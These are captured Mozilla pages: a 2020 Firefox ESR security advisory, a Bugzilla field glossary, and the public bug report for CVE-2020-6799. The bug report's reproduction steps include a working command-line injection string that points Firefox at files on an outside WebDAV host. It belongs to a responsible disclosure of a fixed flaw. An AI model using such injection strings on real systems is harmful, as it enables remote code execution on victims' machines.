=== Content from www.mozilla.org_726b16e0_20250119_113135.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-06

## Security Vulnerabilities fixed in Firefox ESR 68.5

Announced
February 11, 2020
Impact
high
Products
Firefox ESR
Fixed in

* Firefox ESR 68.5

#### [#CVE-2020-6796: Missing bounds check on shared memory read in the parent process](#CVE-2020-6796)

Reporter
Thomas Imbert
Impact
high
##### Description

A content process could have modified shared memory relating to crash reporting information, crash itself, and cause an out-of-bound write. This could have caused memory corruption and a potentially exploitable crash.

##### References

* [Bug 1610426](https://bugzilla.mozilla.org/show_bug.cgi?id=1610426)

#### [#CVE-2020-6797: Extensions granted downloads.open permission could open arbitrary applications on Mac OSX](#CVE-2020-6797)

Reporter
Vladimir Metnew
Impact
moderate
##### Description

By downloading a file with the .fileloc extension, a semi-privileged extension could launch an arbitrary application on the user's computer. The attacker is restricted as they are unable to download non-quarantined files or supply command line arguments to the application, limiting the impact.
*Note: this issue only occurs on Mac OSX. Other operating systems are unaffected.*

##### References

* [Bug 1596668](https://bugzilla.mozilla.org/show_bug.cgi?id=1596668)

#### [#CVE-2020-6798: Incorrect parsing of template tag could result in JavaScript injection](#CVE-2020-6798)

Reporter
terjanq
Impact
moderate
##### Description

If a `<template>` tag was used in a `<select%gt;` tag, the parser could be confused and allow JavaScript parsing and execution when it should not be allowed. A site that relied on the browser behaving correctly could suffer a cross-site scripting vulnerability as a result.

##### References

* [Bug 1602944](https://bugzilla.mozilla.org/show_bug.cgi?id=1602944)

#### [#CVE-2020-6799: Arbitrary code execution when opening pdf links from other applications, when Firefox is configured as default pdf reader](#CVE-2020-6799)

Reporter
Joshua Graham & Brendan Scarvell
Impact
moderate
##### Description

Command line arguments could have been injected during Firefox invocation as a shell handler for certain unsupported file types. This required Firefox to be configured as the default handler for a given file type and for a file downloaded to be opened in a third party application that insufficiently sanitized URL data. In that situation, clicking a link in the third party application could have been used to retrieve and execute files whose location was supplied through command line arguments.
*Note: This issue only affects Windows operating systems and when Firefox is configured as the default handler for non-default filetypes. Other operating systems are unaffected.*

##### References

* [Bug 1606596](https://bugzilla.mozilla.org/show_bug.cgi?id=1606596)

#### [#CVE-2020-6800: Memory safety bugs fixed in Firefox 73 and Firefox ESR 68.5](#CVE-2020-6800)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Raul Gurzau, Tyson Smith, Bob Clary, Liz Henry, and Christian Holler reported memory safety bugs present in Firefox 72 and Firefox ESR 68.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 73 and Firefox ESR 68.5](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from wiki.mozilla.org_73f8d6fa_20250119_132256.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from bugzilla.mozilla.org_24c58687_20250119_113133.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1606596)
* [XML](/show_bug.cgi?ctype=xml&id=1606596)

Closed
[Bug 1606596](/show_bug.cgi?id=1606596)
(CVE-2020-6799)

Opened 5 years ago
Closed 5 years ago

# File association Remote Code Execution via command line parameter injection in Firefox

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

File association Remote Code Execution via command line parameter injection in Firefox

## Categories

### (Firefox :: Installer, defect)

[Product:](/describecomponents.cgi?product=Firefox)

Firefox
▾

Firefox
For bugs in Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the [Core](https://bugzilla.mozilla.org/describecomponents.cgi?product=Core) product. Bugs for developer tools (F12) should be filed in the [DevTools](https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools) product. ([more info](https://wiki.mozilla.org/Modules/All#Firefox))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox&component=Installer#Installer)

Installer
▾

Firefox :: Installer
Bugs and feature requests for the Firefox application install wizard.
[See Open Bugs in This Component](/buglist.cgi?product=Firefox&component=Installer&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox&component=Installer&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox&component=Installer)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Firefox 74

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Accessibility Severity | --- |
| a11y-review | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| Install Update Workflow | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [73+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=73%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox72 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix) |
| firefox73 | [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed) |
| firefox74 | [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr68 | 73+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox72 |  | wontfix |
| firefox73 | + | fixed |
| firefox74 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: jpg.inc.au, Assigned: molly)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/59fd68692a3013b8c8fa55f0d27bb43c?d=mm&size=40)  [molly](/user_profile?user_id=550257)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=40)  [jpg.inc.au](/user_profile?user_id=600722)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/22a9d29be79d978dd156fae057543c68?d=mm&size=40)  [mpohle](/user_profile?user_id=711194)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

13 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1606596&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1606596)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

[1619122](/show_bug.cgi?id=1619122 "VERIFIED FIXED - Firefox don't listed in context menu \"open with...\" with file type .jpg extension")

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2019-9794](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox")

[1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths")

## Details

### (Keywords: csectype-priv-escalation, reporter-external, sec-moderate, Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-6799

[Keywords:](/describekeywords.cgi)

[csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a2802280_1689 "5 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | [qe-verify](#a1322679_458188 "5 years ago") | - |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | blocking-fx-sync1.7 | ? |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files, 1 obsolete file)

| [Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin](/attachment.cgi?id=9119189)  [5 years ago](#c14)  [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)   47 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-beta+](#c32 "5 years ago")  jcristau : [approval-mozilla-release-](#c34 "5 years ago")  RyanVM : [approval-mozilla-esr68+](#c35 "5 years ago")  tjr : [sec-approval+](#c28 "5 years ago") | [Details](/attachment.cgi?id=9119189&action=edit) | [Review](/attachment.cgi?id=9119189) |
| --- | --- | --- |
| [Simple node WebDAV server that will respond to any folder/file name](/attachment.cgi?id=9119318)  [5 years ago](#c21)  [Joshua Graham](/user_profile?user_id=600722)   8.03 KB, text/plain |  | [Details](/attachment.cgi?id=9119318&action=edit) |
| [advisory.txt](/attachment.cgi?id=9122670)  [5 years ago](#c43)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   453 bytes, text/plain |  | [Details](/attachment.cgi?id=9122670&action=edit) |
| [advisory.txt](/attachment.cgi?id=9122901)  [5 years ago](#c46)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   786 bytes, text/plain |  | [Details](/attachment.cgi?id=9122901&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1606596#c0)• 5 years ago |
|  | |

Tested on Microsoft Windows 10 Enterprise version 10.0.17763 Build 17763

Using Firefox version 71.0 (32-bit)

Steps to reproduce (local only):

* Setup Firefox as Windows' default .pdf handler (right click a pdf file -> open with -> chose other -> select always open with Firefox)
* Open the run prompt (windows key + r) and run the following URL:
* \\poiu.xss.vg@ssl\a.txt" -appomni appomni.pdf -greomni \share\greomni.pdf

Steps to reproduce (via MS Excel):

* Setup Firefox as Windows' default .pdf handler (right click a pdf file -> open with -> chose other -> select always open with Firefox)
* visit <https://poiu.xss.vg/oausdhvjzlxkcn/poc.html> (this will open a CSV file in excel)
* Click the link in the excel document.
* Open the greomni.pdf file

Expected Result: Firefox ignores the shell activation command as additional command line arguments are present.

Actual Result: Firefox accepts the command and runs using the greomni and appomni files from the internet share.

Detailed Information:

This issue is very similar to [bug 1530103](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox") and [bug 384384](/show_bug.cgi?id=384384 "RESOLVED FIXED - Multiple Vendor Multiple Browser Interaction URI Handler Command Injection Vulnerability") except that it is by file type association as opposed to protocol association.

